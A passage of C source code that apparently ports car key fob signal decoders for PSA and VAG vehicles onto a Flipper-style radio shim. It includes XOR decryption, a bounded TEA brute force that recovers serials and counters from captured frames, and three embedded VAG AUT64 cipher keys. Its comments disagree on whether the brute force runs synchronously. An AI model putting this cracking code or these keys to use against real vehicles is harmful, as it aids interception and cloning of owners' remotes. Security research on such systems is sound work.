    if(a < b) {
        return b - a;
    } else {
        return a - b;
    }
}

static bool psa_direct_xor_allowed_by_key2(uint8_t key2_high_byte) {
    uint8_t lo = key2_high_byte & 0xf;
    if(lo < 3) return true;
    if(lo < 7 && (key2_high_byte & 0xc) != 0) return true;
    return false;
}

static void psa_calculate_checksum(uint8_t* buffer) {
    uint32_t checksum = 0;
    for(int i = 2; i < 8; i++) {
        checksum += (buffer[i] & 0xF) + ((buffer[i] >> 4) & 0xF);
    }
    buffer[11] = (uint8_t)((checksum * 0x10) & 0xFF);
}

static void psa_copy_reverse(uint8_t* temp, uint8_t* source) {
    temp[0] = source[5];
    temp[1] = source[4];
    temp[2] = source[3];
    temp[3] = source[2];
    temp[4] = source[9];
    temp[5] = source[8];
    temp[6] = source[7];
    temp[7] = source[6];
}

static void psa_second_stage_xor_decrypt(uint8_t* buffer) {
    uint8_t temp[8];
    psa_copy_reverse(temp, buffer);
    buffer[2] = temp[0] ^ temp[6];
    buffer[3] = temp[2] ^ temp[0];
    buffer[4] = temp[6] ^ temp[3];
    buffer[5] = temp[7] ^ temp[1];
    buffer[6] = temp[3] ^ temp[1];
    buffer[7] = temp[6] ^ temp[4] ^ temp[5];
}

static void psa_extract_fields_mode23(uint8_t* buffer, PpDec_psa* instance) {
    instance->decrypted_button = buffer[8] & 0xF;
    instance->decrypted_serial = ((uint32_t)buffer[3] << 8) | ((uint32_t)buffer[2] << 16) |
                                 (uint32_t)buffer[4];
    instance->decrypted_counter = (uint32_t)buffer[6] | ((uint32_t)buffer[5] << 8);
    instance->decrypted_crc = (uint16_t)buffer[7];
    instance->decrypted_type = 0x23;
    instance->decrypted_seed = instance->decrypted_serial;
}

static bool psa_direct_xor_decrypt(PpDec_psa* instance, uint8_t* buffer) {
    psa_calculate_checksum(buffer);
    uint8_t checksum = buffer[11];
    uint8_t key2_high = buffer[8];

    uint8_t validation_result = (checksum ^ key2_high) & 0xF0;

    if(validation_result == 0) {
        buffer[13] = buffer[9] ^ buffer[8];
        psa_second_stage_xor_decrypt(buffer);
        psa_extract_fields_mode23(buffer, instance);
        return true;
    }
    return false;
}

/* ---- Finalize: RELOCATED from psa_get_string ----------------------------
 * In the original, a Type 0x36 frame is flagged "deferred to get_string",
 * where psa_decrypt_router (and ultimately the TEA brute force) computes the
 * displayed serial/counter. Here the same work runs synchronously at the
 * moment feed decides a frame is complete, so a completed frame ends with the
 * generic block populated. Direct-XOR (Type 0x23) is already resolved by
 * psa_handle_decoded_frame; only the 0x36 brute force remains to relocate. */
// (g_pp_bf_kind / g_pp_bf_ready sont déclarés dans le shim, en amont.)
static PsaBfState       g_pp_psa_bf;                 // état BF PSA mémorisé

static void psa_finalize(PpDec_psa* instance) {
    if(instance->decrypted != 0x50) {
        // NE PAS cracker inline (jusqu'à ~33 M itérations → gèlerait feed() + watchdog).
        // On mémorise l'état ; le crack se fera à la demande dans une tâche séparée
        // avec barre de progression + annulation, exactement comme ProtoPirate.
        memset(&g_pp_psa_bf, 0, sizeof(g_pp_psa_bf));
        g_pp_psa_bf.key1_low  = instance->key1_low;
        g_pp_psa_bf.key1_high = instance->key1_high;
        g_pp_psa_bf.key2_low  = (uint16_t)(instance->key2_low & 0xFFFF);
        g_pp_psa_bf.cancel = 0;
        g_pp_psa_bf.status = PSA_BF_STATUS_IDLE;
        g_pp_bf_kind  = PP_BF_PSA;
        g_pp_bf_ready = true;
    }

    /* Publish decoded fields to the generic block for the shim callback. */
    instance->generic.serial = instance->decrypted_serial;
    instance->generic.cnt = (uint16_t)instance->decrypted_counter;
    instance->generic.btn = instance->decrypted_button;
    instance->generic.seed = instance->decrypted_seed;
    instance->generic.data = ((uint64_t)instance->key1_high << 32) | instance->key1_low;
    instance->generic.data_2 = ((uint64_t)instance->key2_high << 32) | instance->key2_low;
    instance->generic.data_count_bit = 128;

    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }

    instance->decode_data_low = 0;
    instance->decode_data_high = 0;
    instance->decode_count_bit = 0;
}

/* ---- Completed-frame handler (from psa.c; callback tail -> psa_finalize) - */
static void psa_handle_decoded_frame(PpDec_psa* instance, uint8_t direct_xor_mode) {
    instance->key2_low = instance->decode_data_low;
    instance->key2_high = instance->decode_data_high;
    instance->validation_field = (uint16_t)(instance->decode_data_low & 0xFFFF);
    instance->decrypted_type = 0;
    instance->decrypted_button = 0;
    instance->decrypted_serial = 0;
    instance->decrypted_counter = 0;
    instance->decrypted_crc = 0;
    instance->decrypted_seed = 0;
    instance->decrypted = 0x00;
    instance->mode_serialize = psa_direct_xor_allowed_by_key2((uint8_t)(instance->key2_low >> 8)) ?
                                   direct_xor_mode :
                                   0x36;
    instance->status_flag = 0x80;

    uint8_t buffer[PSA_BUFFER_SIZE] = {0};
    psa_crypto_setup_byte_buffer(
        buffer, instance->key1_low, instance->key1_high, instance->key2_low);
    if(instance->mode_serialize != 0x36 && psa_direct_xor_decrypt(instance, buffer)) {
        instance->mode_serialize = 0x23;
        instance->decrypted = 0x50;
    } else {
        instance->decrypted = 0x00;
        instance->mode_serialize = 0x36;
    }

    /* Relocated finalize: BF for 0x36 + generic fill + callback + buffer reset. */
    psa_finalize(instance);
}

/* ---- Lifecycle ---------------------------------------------------------- */
static void* psa_alloc(void) {
    PpDec_psa* i = (PpDec_psa*)calloc(1, sizeof(PpDec_psa));
    if(!i) return NULL;
    i->generic.protocol_name = "PSA";
    i->manchester_state = ManchesterStateMid1;
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

static void psa_reset(void* context) {
    PpDec_psa* instance = (PpDec_psa*)context;
    instance->state = 0;
    instance->status_flag = 0;
    instance->mode_serialize = 0;
    instance->key1_low = 0;
    instance->key1_high = 0;
    instance->key2_low = 0;
    instance->key2_high = 0;
    instance->decode_data_low = 0;
    instance->decode_data_high = 0;
    instance->decode_count_bit = 0;
    instance->pattern_counter = 0;
    instance->manchester_state = ManchesterStateMid1;
    instance->decrypted_button = 0;
    instance->decrypted_serial = 0;
    instance->decrypted_counter = 0;
    instance->decrypted_crc = 0;
    instance->decrypted_seed = 0;
    instance->decrypted_type = 0;
}

/* ---- Feed (from psa.c; const renamed to psa_const) ---------------------- */
static void psa_feed(void* context, bool level, uint32_t duration) {
    PpDec_psa* instance = (PpDec_psa*)context;

    uint32_t tolerance;
    uint32_t new_state = instance->state;
    uint32_t prev_dur = instance->prev_duration;
    uint32_t te_short = psa_const.te_short;
    uint32_t te_long = psa_const.te_long;

    switch(instance->state) {
    case PSADecoderState0:
        if(!level) {
            return;
        }

        if(duration < te_short) {
            tolerance = te_short - duration;
            if(tolerance > PSA_TOLERANCE_99) {
                if(duration < PSA_TE_SHORT_125) {
                    tolerance = PSA_TE_SHORT_125 - duration;
                } else {
                    tolerance = duration - PSA_TE_SHORT_125;
                }
                if(tolerance > 40) {
                    return;
                }
                if(duration > 180) {
                    return;
                }
                new_state = PSADecoderState3;
            } else {
                new_state = PSADecoderState1;
            }
        } else {
            tolerance = duration - te_short;
            if(tolerance > PSA_TOLERANCE_99) {
                return;
            }
            new_state = PSADecoderState1;
        }

        instance->decode_data_low = 0;
        instance->decode_data_high = 0;
        instance->pattern_counter = 0;
        instance->decode_count_bit = 0;
        instance->mode_serialize = 0;
        instance->prev_duration = duration;
        instance->decrypted_type = 0;
        instance->decrypted_button = 0;
        instance->decrypted_serial = 0;
        instance->decrypted_counter = 0;
        instance->decrypted_crc = 0;
        instance->decrypted_seed = 0;
        instance->decrypted = 0x00;
        manchester_advance(
            instance->manchester_state, ManchesterEventReset, &instance->manchester_state, NULL);
        break;

    case PSADecoderState1:
        if(level) {
            return;
        }

        if(duration < te_short) {
            tolerance = te_short - duration;
            if(tolerance < PSA_TOLERANCE_100) {
                uint32_t prev_diff = psa_abs_diff(prev_dur, te_short);
                if(prev_diff <= PSA_TOLERANCE_99) {
                    instance->pattern_counter++;
                }
                instance->prev_duration = duration;
                return;
            }
        } else {
            tolerance = duration - te_short;
            if(tolerance < PSA_TOLERANCE_100) {
                uint32_t prev_diff = psa_abs_diff(prev_dur, te_short);
                if(prev_diff <= PSA_TOLERANCE_99) {
                    instance->pattern_counter++;
                }
                instance->prev_duration = duration;
                return;
            } else {
                uint32_t long_diff;
                if(duration < te_long) {
                    long_diff = te_long - duration;
                } else {
                    long_diff = duration - te_long;
                }
                if(long_diff < 100) {
                    if(instance->pattern_counter > PSA_PATTERN_THRESHOLD_1) {
                        new_state = PSADecoderState2;
                        instance->decode_data_low = 0;
                        instance->decode_data_high = 0;
                        instance->decode_count_bit = 0;
                        manchester_advance(
                            instance->manchester_state,
                            ManchesterEventReset,
                            &instance->manchester_state,
                            NULL);
                        instance->state = new_state;
                    }
                    instance->pattern_counter = 0;
                    instance->prev_duration = duration;
                    return;
                }
            }
        }

        new_state = PSADecoderState0;
        instance->pattern_counter = 0;
        break;

    case PSADecoderState2: {
        if(instance->decode_count_bit >= PSA_MAX_BITS) {
            new_state = PSADecoderState0;
            break;
        }

        if(level && instance->decode_count_bit == PSA_KEY2_BITS) {
            if(duration >= 800) {
                uint32_t end_diff;
                if(duration < PSA_TE_END_1000) {
                    end_diff = PSA_TE_END_1000 - duration;
                } else {
                    end_diff = duration - PSA_TE_END_1000;
                }
                if(end_diff <= 199) {
                    if(((instance->key1_high >> 16) & 0xF) != 0xA) {
                        instance->decode_data_low = 0;
                        instance->decode_data_high = 0;
                        instance->decode_count_bit = 0;
                        new_state = PSADecoderState0;
                        instance->state = new_state;
                        return;
                    }
                    psa_handle_decoded_frame(instance, 1);
                    new_state = PSADecoderState0;
                    instance->state = new_state;
                    return;
                }
            }
        }

        uint8_t manchester_input = 0;
        bool should_process = false;

        if(duration < te_short) {
            tolerance = te_short - duration;
            if(tolerance >= PSA_TOLERANCE_100) {
                return;
            }
            manchester_input = ((level ^ 1) & 0x7f) << 1;
            should_process = true;
        } else {
            tolerance = duration - te_short;
            if(tolerance < PSA_TOLERANCE_100) {
                manchester_input = ((level ^ 1) & 0x7f) << 1;
                should_process = true;
            } else if(duration < te_long) {
                uint32_t diff_from_250 = duration - te_short;
                uint32_t diff_from_500 = te_long - duration;

                if(diff_from_500 < 150 || diff_from_250 > diff_from_500) {
                    if(level == 0) {
                        manchester_input = 6;
                    } else {
                        manchester_input = 4;
                    }
                    should_process = true;
                } else if(diff_from_250 < 150) {
                    manchester_input = ((level ^ 1) & 0x7f) << 1;
                    should_process = true;
                } else {
                    if(duration > 10000) {
                        new_state = PSADecoderState0;
                        instance->pattern_counter = 0;
                        return;
                    }
                    if(duration >= 350 && duration <= 400) {
                        if(level == 0) {
                            manchester_input = 6;
                        } else {
                            manchester_input = 4;
                        }
                        should_process = true;
                    } else {
                        return;
                    }
                }
            } else {
                uint32_t long_diff = duration - te_long;
                if(long_diff < 100) {
                    if(level == 0) {
                        manchester_input = 6;
                    } else {
                        manchester_input = 4;
                    }
                    should_process = true;
                } else {
                    if(!level) {
                        if(duration > 10000) {
                            new_state = PSADecoderState0;
                            instance->pattern_counter = 0;
                            return;
                        }
                        return;
                    }
                    should_process = false;
                }
            }
        }

        if(should_process && instance->decode_count_bit < PSA_KEY2_BITS) {
            bool decoded_bit = false;

            if(manchester_advance(
                   instance->manchester_state,
                   (ManchesterEvent)manchester_input,
                   &instance->manchester_state,
                   &decoded_bit)) {
                uint32_t carry = (instance->decode_data_low >> 31) & 1;
                instance->decode_data_low = (instance->decode_data_low << 1) |
                                            (decoded_bit ? 1 : 0);
                instance->decode_data_high = (instance->decode_data_high << 1) | carry;
                instance->decode_count_bit++;

                if(instance->decode_count_bit == PSA_KEY1_BITS) {
                    instance->key1_low = instance->decode_data_low;
                    instance->key1_high = instance->decode_data_high;
                    instance->decode_data_low = 0;
                    instance->decode_data_high = 0;
                }
            }
        }

        if(!level) {
            return;
        }

        if(!should_process) {
            uint32_t end_diff;
            if(duration < PSA_TE_END_1000) {
                end_diff = PSA_TE_END_1000 - duration;
            } else {
                end_diff = duration - PSA_TE_END_1000;
            }
            if(end_diff <= 199) {
                if(instance->decode_count_bit != PSA_KEY2_BITS) {
                    return;
                }

                if(((instance->key1_high >> 16) & 0xF) == 0xA) {
                    psa_handle_decoded_frame(instance, 1);
                    new_state = PSADecoderState0;
                    instance->state = new_state;
                    return;
                } else {
                    return;
                }
            } else {
                return;
            }
        }
        break;
    }

    case PSADecoderState3:
        if(duration >= 250) {
            if(duration >= PSA_TE_LONG_250 && duration < PSA_TE_LONG_300) {
                if(instance->pattern_counter > PSA_PATTERN_THRESHOLD_2) {
                    new_state = PSADecoderState4;
                    instance->decode_data_low = 0;
                    instance->decode_data_high = 0;
                    instance->decode_count_bit = 0;
                    manchester_advance(
                        instance->manchester_state,
                        ManchesterEventReset,
                        &instance->manchester_state,
                        NULL);
                    instance->state = new_state;
                    instance->pattern_counter = 0;
                    instance->prev_duration = duration;
                    return;
                }
            }
            new_state = PSADecoderState0;
            instance->pattern_counter = 0;
            break;
        }

        if(duration < PSA_TE_SHORT_125) {
            tolerance = PSA_TE_SHORT_125 - duration;
        } else {
            tolerance = duration - PSA_TE_SHORT_125;
        }

        if(tolerance < PSA_TOLERANCE_50) {
            uint32_t prev_diff = psa_abs_diff(prev_dur, PSA_TE_SHORT_125);
            if(prev_diff <= PSA_TOLERANCE_49) {
                instance->pattern_counter++;
            } else {
                instance->pattern_counter = 0;
            }
            instance->prev_duration = duration;
            return;
        }

        new_state = PSADecoderState0;
        instance->pattern_counter = 0;
        break;

    case PSADecoderState4:
        if(instance->decode_count_bit >= PSA_MAX_BITS) {
            new_state = PSADecoderState0;
            break;
        }

        if(!level) {
            uint8_t manchester_input4;
            bool decoded_bit = false;

            if(duration < PSA_TE_SHORT_125) {
                tolerance = PSA_TE_SHORT_125 - duration;
                if(tolerance > PSA_TOLERANCE_49) {
                    return;
                }
                manchester_input4 = ((level ^ 1) & 0x7f) << 1;
            } else {
                tolerance = duration - PSA_TE_SHORT_125;
                if(tolerance < PSA_TOLERANCE_50) {
                    manchester_input4 = ((level ^ 1) & 0x7f) << 1;
                } else if(duration >= PSA_TE_LONG_250 && duration < PSA_TE_LONG_300) {
                    if(level == 0) {
                        manchester_input4 = 6;
                    } else {
                        manchester_input4 = 4;
                    }
                } else {
                    return;
                }
            }

            if(manchester_advance(
                   instance->manchester_state,
                   (ManchesterEvent)manchester_input4,
                   &instance->manchester_state,
                   &decoded_bit)) {
                uint32_t carry = (instance->decode_data_low >> 31) & 1;
                instance->decode_data_low = (instance->decode_data_low << 1) |
                                            (decoded_bit ? 1 : 0);
                instance->decode_data_high = (instance->decode_data_high << 1) | carry;
                instance->decode_count_bit++;

                if(instance->decode_count_bit == PSA_KEY1_BITS) {
                    instance->key1_low = instance->decode_data_low;
                    instance->key1_high = instance->decode_data_high;
                    instance->decode_data_low = 0;
                    instance->decode_data_high = 0;
                }
            }
        } else if(level) {
            uint32_t end_diff;
            if(duration < PSA_TE_END_500) {
                end_diff = PSA_TE_END_500 - duration;
            } else {
                end_diff = duration - PSA_TE_END_500;
            }
            if(end_diff <= 99) {
                if(instance->decode_count_bit != PSA_KEY2_BITS) {
                    return;
                }

                if(((instance->key1_high >> 16) & 0xF) != 0xA) {
                    instance->decode_data_low = 0;
                    instance->decode_data_high = 0;
                    instance->decode_count_bit = 0;
                    new_state = PSADecoderState0;
                    instance->state = new_state;
                    return;
                }
                psa_handle_decoded_frame(instance, 2);
                new_state = PSADecoderState0;
                instance->state = new_state;
                return;
            } else {
                return;
            }
        }
        break;
    }

    instance->state = new_state;
    instance->prev_duration = duration;
}

/* ============================================================================
 * REGISTRY LINE:
 *     { "PSA", psa_alloc, psa_feed, psa_reset, nullptr },
 *
 * RELOCATED FROM get_string:
 *   The original decoder marks Type 0x36 frames "deferred to get_string";
 *   psa_get_string then re-ran psa_decrypt_router and (via the separate,
 *   user-triggered psa_brute_force_run) computed the displayed serial/counter.
 *   Since get_string is dropped, that work now runs synchronously in the new
 *   static psa_finalize(), invoked at the tail of psa_handle_decoded_frame
 *   (i.e. exactly where feed decides a frame is complete):
 *     - Type 0x23 (direct XOR) is already resolved in psa_handle_decoded_frame
 *       before finalize, so its serial/counter/crc/seed are set there.
 *     - For every non-0x23 frame (decrypted != 0x50), psa_finalize builds a
 *       PsaBfState from key1_low/high + the 16-bit key2, runs the bounded
 *       psa_brute_force_run(), and on PSA_BF_STATUS_FOUND copies
 *       button/serial/counter/crc/seed/type(0x36) back into the instance.
 *     - psa_finalize then publishes serial/cnt/btn/seed and data(=Key1 64-bit)/
 *       data_2(=Key2)/data_count_bit(=128) into instance->generic and fires the
 *       shim callback, then clears the decode buffers.
 *   psa_decrypt_router itself was DROPPED: its decode-relevant behavior (the
 *   direct-XOR attempt for 0x23 and the "defer to BF" for 0x36) is already
 *   covered by psa_handle_decoded_frame + psa_finalize; the router was only
 *   otherwise reached from the dropped deserialize/get_string paths.
 *
 * DROPPED: all #include; the whole PROTOPIRATE_WITH_ENCODER encoder struct +
 *   functions (build_upload / mode23 / mode36 / xor_encrypt / tea_encrypt /
 *   alloc/free/deserialize/stop/yield); _serialize / _deserialize /
 *   _get_hash_data / _get_string; psa_decrypt_router; psa_handle_decoded_frame's
 *   FURI_LOG lines (shim no-ops, elided); psa_bf_state_from_flipper_format and
 *   psa_brute_force_thread_entry (FlipperFormat / RTOS-thread only); all
 *   FuriString / flipper_format_* usage; the SubGhzProtocol/Decoder/Encoder
 *   registration structs and every instance->base.protocol = &... assignment.
 *   The file-scope `#pragma GCC optimize("O3","unroll-loops")` was dropped so it
 *   cannot leak into the rest of the translation unit; the per-loop
 *   `#pragma GCC unroll 32` hints were kept (harmless, local).
 *
 * BRUTE FORCE BOUNDED: yes. Two contiguous 24-bit sweeps, fully bounded, no
 *   dependence on external input for the loop count:
 *     BF1: 0x23000000..0x24000000  = 16,777,216 iterations
 *     BF2: 0xF3000000..0xF4000000  = 16,777,216 iterations
 *   Worst case (no match) = 33,554,432 iterations, then PSA_BF_STATUS_NOT_FOUND.
 *   Each BF1 iter = 2 TEA encrypts + 1 TEA decrypt; each BF2 iter = 1 TEA
 *   decrypt (+CRC16 only on the rare 24-bit prefix match). Runs to completion
 *   on-device; state->cancel is retained but always 0 in this synchronous use.
 *
 * UNRESOLVED SYMBOLS: none.
 *   All decode-path symbols are either shim-provided (SubGhzBlockConst,
 *   SubGhzBlockDecoder, SubGhzBlockGeneric, SubGhzProtocolDecoderBase,
 *   ManchesterState/Event, ManchesterStateMid1, ManchesterEventReset,
 *   manchester_advance, pp_cb, calloc) or defined above in this fragment.
 * ==========================================================================*/


// ===== ARF decoders (clés embarquées, GPL) =====
// ===========================================================================
// VAG — Flipper-ARF (GPL, clés AUT64 embarquées)
// ---------------------------------------------------------------------------
// Décodeur VAG (VW/Audi/Seat/Skoda) porté depuis Flipper-ARF (GPL).
// Crypto AUT64 + clés packées EMBARQUÉES dans la source — aucun keystore
// externe, entièrement portable. Encodeur / serialize / get_string retirés.
// S'appuie sur le shim ProtoPirate (SubGhzBlock*, manchester_advance, pp_cb…).
// ===========================================================================

// --- AUT64 constants (from aut64.h) ---------------------------------------
#define AUT64_NUM_ROUNDS 12
#define AUT64_BLOCK_SIZE 8
#define AUT64_KEY_SIZE   8
#define AUT64_PBOX_SIZE  8
#define AUT64_SBOX_SIZE  16
#define AUT64_KEY_STRUCT_PACKED_SIZE 16

struct aut64_key {
    uint8_t index;
    uint8_t key[AUT64_KEY_SIZE];
    uint8_t pbox[AUT64_PBOX_SIZE];
    uint8_t sbox[AUT64_SBOX_SIZE];
};

// --- AUT64 static boxes (from aut64.c) ------------------------------------
static const uint8_t table_ln[AUT64_NUM_ROUNDS][8] = {
    {0x4, 0x5, 0x6, 0x7, 0x0, 0x1, 0x2, 0x3}, // Round 0
    {0x5, 0x4, 0x7, 0x6, 0x1, 0x0, 0x3, 0x2}, // Round 1
    {0x6, 0x7, 0x4, 0x5, 0x2, 0x3, 0x0, 0x1}, // Round 2
    {0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0}, // Round 3
    {0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7}, // Round 4
    {0x1, 0x0, 0x3, 0x2, 0x5, 0x4, 0x7, 0x6}, // Round 5
    {0x2, 0x3, 0x0, 0x1, 0x6, 0x7, 0x4, 0x5}, // Round 6
    {0x3, 0x2, 0x1, 0x0, 0x7, 0x6, 0x5, 0x4}, // Round 7
    {0x5, 0x4, 0x7, 0x6, 0x1, 0x0, 0x3, 0x2}, // Round 8
    {0x4, 0x5, 0x6, 0x7, 0x0, 0x1, 0x2, 0x3}, // Round 9
    {0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0}, // Round 10
    {0x6, 0x7, 0x4, 0x5, 0x2, 0x3, 0x0, 0x1}, // Round 11
};

static const uint8_t table_un[AUT64_NUM_ROUNDS][8] = {
    {0x1, 0x0, 0x3, 0x2, 0x5, 0x4, 0x7, 0x6}, // Round 0
    {0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7}, // Round 1
    {0x3, 0x2, 0x1, 0x0, 0x7, 0x6, 0x5, 0x4}, // Round 2
    {0x2, 0x3, 0x0, 0x1, 0x6, 0x7, 0x4, 0x5}, // Round 3
    {0x5, 0x4, 0x7, 0x6, 0x1, 0x0, 0x3, 0x2}, // Round 4
    {0x4, 0x5, 0x6, 0x7, 0x0, 0x1, 0x2, 0x3}, // Round 5
    {0x7, 0x6, 0x5, 0x4, 0x3, 0x2, 0x1, 0x0}, // Round 6
    {0x6, 0x7, 0x4, 0x5, 0x2, 0x3, 0x0, 0x1}, // Round 7
    {0x3, 0x2, 0x1, 0x0, 0x7, 0x6, 0x5, 0x4}, // Round 8
    {0x2, 0x3, 0x0, 0x1, 0x6, 0x7, 0x4, 0x5}, // Round 9
    {0x1, 0x0, 0x3, 0x2, 0x5, 0x4, 0x7, 0x6}, // Round 10
    {0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7}, // Round 11
};

static const uint8_t table_offset[256] = {
    // 0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, // 0
    0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xA, 0xB, 0xC, 0xD, 0xE, 0xF, // 1
    0x0, 0x2, 0x4, 0x6, 0x8, 0xA, 0xC, 0xE, 0x3, 0x1, 0x7, 0x5, 0xB, 0x9, 0xF, 0xD, // 2
    0x0, 0x3, 0x6, 0x5, 0xC, 0xF, 0xA, 0x9, 0xB, 0x8, 0xD, 0xE, 0x7, 0x4, 0x1, 0x2, // 3
    0x0, 0x4, 0x8, 0xC, 0x3, 0x7, 0xB, 0xF, 0x6, 0x2, 0xE, 0xA, 0x5, 0x1, 0xD, 0x9, // 4
    0x0, 0x5, 0xA, 0xF, 0x7, 0x2, 0xD, 0x8, 0xE, 0xB, 0x4, 0x1, 0x9, 0xC, 0x3, 0x6, // 5
    0x0, 0x6, 0xC, 0xA, 0xB, 0xD, 0x7, 0x1, 0x5, 0x3, 0x9, 0xF, 0xE, 0x8, 0x2, 0x4, // 6
    0x0, 0x7, 0xE, 0x9, 0xF, 0x8, 0x1, 0x6, 0xD, 0xA, 0x3, 0x4, 0x2, 0x5, 0xC, 0xB, // 7
    0x0, 0x8, 0x3, 0xB, 0x6, 0xE, 0x5, 0xD, 0xC, 0x4, 0xF, 0x7, 0xA, 0x2, 0x9, 0x1, // 8
    0x0, 0x9, 0x1, 0x8, 0x2, 0xB, 0x3, 0xA, 0x4, 0xD, 0x5, 0xC, 0x6, 0xF, 0x7, 0xE, // 9
    0x0, 0xA, 0x7, 0xD, 0xE, 0x4, 0x9, 0x3, 0xF, 0x5, 0x8, 0x2, 0x1, 0xB, 0x6, 0xC, // A
    0x0, 0xB, 0x5, 0xE, 0xA, 0x1, 0xF, 0x4, 0x7, 0xC, 0x2, 0x9, 0xD, 0x6, 0x8, 0x3, // B
    0x0, 0xC, 0xB, 0x7, 0x5, 0x9, 0xE, 0x2, 0xA, 0x6, 0x1, 0xD, 0xF, 0x3, 0x4, 0x8, // C
    0x0, 0xD, 0x9, 0x4, 0x1, 0xC, 0x8, 0x5, 0x2, 0xF, 0xB, 0x6, 0x3, 0xE, 0xA, 0x7, // D
    0x0, 0xE, 0xF, 0x1, 0xD, 0x3, 0x2, 0xC, 0x9, 0x7, 0x6, 0x8, 0x4, 0xA, 0xB, 0x5, // E
    0x0, 0xF, 0xD, 0x2, 0x9, 0x6, 0x4, 0xB, 0x1, 0xE, 0xC, 0x3, 0x8, 0x7, 0x5, 0xA // F
};

static const uint8_t table_sub[16] = {
    0x0, 0x1, 0x9, 0xE, 0xD, 0xB, 0x7, 0x6, 0xF, 0x2, 0xC, 0x5, 0xA, 0x4, 0x3, 0x8,
};

// --- AUT64 static helpers on the decrypt path -----------------------------
static uint8_t key_nibble(
    const struct aut64_key key,
    const uint8_t nibble,
    const uint8_t table[],
    const uint8_t iteration) {
    const uint8_t keyValue = key.key[table[iteration]];
    const uint8_t offset = (keyValue << 4) | nibble;
    return table_offset[offset];
}

static uint8_t round_key(const struct aut64_key key, const uint8_t state[], const uint8_t roundN) {
    uint8_t result_hi = 0, result_lo = 0;

    for(int i = 0; i < AUT64_BLOCK_SIZE - 1; i++) {
        result_hi ^= key_nibble(key, state[i] >> 4, table_un[roundN], i);
        result_lo ^= key_nibble(key, state[i] & 0x0F, table_ln[roundN], i);
    }

    return (result_hi << 4) | result_lo;
}

static uint8_t final_byte_nibble(const struct aut64_key key, const uint8_t table[]) {
    const uint8_t keyValue = key.key[table[AUT64_BLOCK_SIZE - 1]];
    return table_sub[keyValue] << 4;
}

static uint8_t decrypt_final_byte_nibble(
    const struct aut64_key key,
    const uint8_t nibble,
    const uint8_t table[],
    const uint8_t result) {
    const uint8_t offset = final_byte_nibble(key, table);

    return table_offset[(result ^ nibble) + offset];
}

static uint8_t
    decrypt_compress(const struct aut64_key key, const uint8_t state[], const uint8_t roundN) {
    const uint8_t roundKey = round_key(key, state, roundN);
    uint8_t result_hi = roundKey >> 4, result_lo = roundKey & 0x0F;

    result_hi = decrypt_final_byte_nibble(
        key, state[AUT64_BLOCK_SIZE - 1] >> 4, table_un[roundN], result_hi);
    result_lo = decrypt_final_byte_nibble(
        key, state[AUT64_BLOCK_SIZE - 1] & 0x0F, table_ln[roundN], result_lo);

    return (result_hi << 4) | result_lo;
}

static uint8_t substitute(const struct aut64_key key, const uint8_t byte) {
    return (key.sbox[byte >> 4] << 4) | key.sbox[byte & 0x0F];
}

static void permute_bytes(const struct aut64_key key, uint8_t state[]) {
    uint8_t result[AUT64_PBOX_SIZE] = {0};

    for(int i = 0; i < AUT64_PBOX_SIZE; i++) {
        result[key.pbox[i]] = state[i];
    }

    memcpy(state, result, AUT64_PBOX_SIZE);
}

static uint8_t permute_bits(const struct aut64_key key, const uint8_t byte) {
    uint8_t result = 0;

    for(int i = 0; i < 8; i++) {
        if(byte & (1 << i)) {
            result |= (1 << key.pbox[i]);
        }
    }

    return result;
}

static void aut64_decrypt(const struct aut64_key key, uint8_t message[]) {
    for(int i = AUT64_NUM_ROUNDS - 1; i >= 0; i--) {
        message[7] = substitute(key, message[7]);
        message[7] = permute_bits(key, message[7]);
        message[7] = substitute(key, message[7]);
        message[7] = decrypt_compress(key, message, i);
        permute_bytes(key, message);
    }
}

static void aut64_unpack(struct aut64_key* dest, const uint8_t src[]) {
    dest->index = src[0];

    for(uint8_t i = 0; i < sizeof(dest->key) / 2; i++) {
        dest->key[i * 2] = src[i + 1] >> 4;
        dest->key[i * 2 + 1] = src[i + 1] & 0xF;
    }

    uint32_t pbox = (src[5] << 16) | (src[6] << 8) | src[7];

    for(int8_t i = sizeof(dest->pbox) - 1; i >= 0; i--) {
        dest->pbox[i] = pbox & 0x7;
        pbox >>= 3;
    }

    for(uint8_t i = 0; i < sizeof(dest->sbox) / 2; i++) {
        dest->sbox[i * 2] = src[i + 8] >> 4;
        dest->sbox[i * 2 + 1] = src[i + 8] & 0xF;
    }
}

// --- Embedded VAG AUT64 keys (packed) -------------------------------------
#define VAG_KEYS_COUNT 3

static const uint8_t vag_keys_packed[VAG_KEYS_COUNT][AUT64_KEY_STRUCT_PACKED_SIZE] = {
    {0x01, 0x37, 0x6C, 0x86, 0xAD, 0xAB, 0xCC, 0x43, 0x07, 0x4D, 0xE8, 0x59, 0xC1, 0x2F, 0x36, 0xAB},
    {0x02, 0x37, 0x7C, 0x65, 0xCE, 0xDC, 0x42, 0xEA, 0xA4, 0x53, 0xE8, 0x61, 0xD9, 0xB7, 0x20, 0xFC},
    {0x03, 0x8A, 0xA3, 0x7B, 0x1E, 0x56, 0x1F, 0x83, 0x84, 0xB6, 0x19, 0xC5, 0x2E, 0x0A, 0x3F, 0xD7}
};

static struct aut64_key protocol_vag_keys[VAG_KEYS_COUNT];
static int8_t protocol_vag_keys_loaded = -1;

static void protocol_vag_load_keys(void) {
    if(protocol_vag_keys_loaded >= 0) {
        return;
    }

    for(uint8_t i = 0; i < VAG_KEYS_COUNT; i++) {
        aut64_unpack(&protocol_vag_keys[i], vag_keys_packed[i]);
    }

    protocol_vag_keys_loaded = 0;
}

static struct aut64_key* protocol_vag_get_key(uint8_t index) {
    for(uint8_t i = 0; i < VAG_KEYS_COUNT; i++) {
        if(protocol_vag_keys[i].index == index) {
            return &protocol_vag_keys[i];
        }
    }

    return NULL;
}

// --- VAG protocol constants -----------------------------------------------
static const SubGhzBlockConst vag_const = {
    .te_short = 500,
    .te_long = 1000,
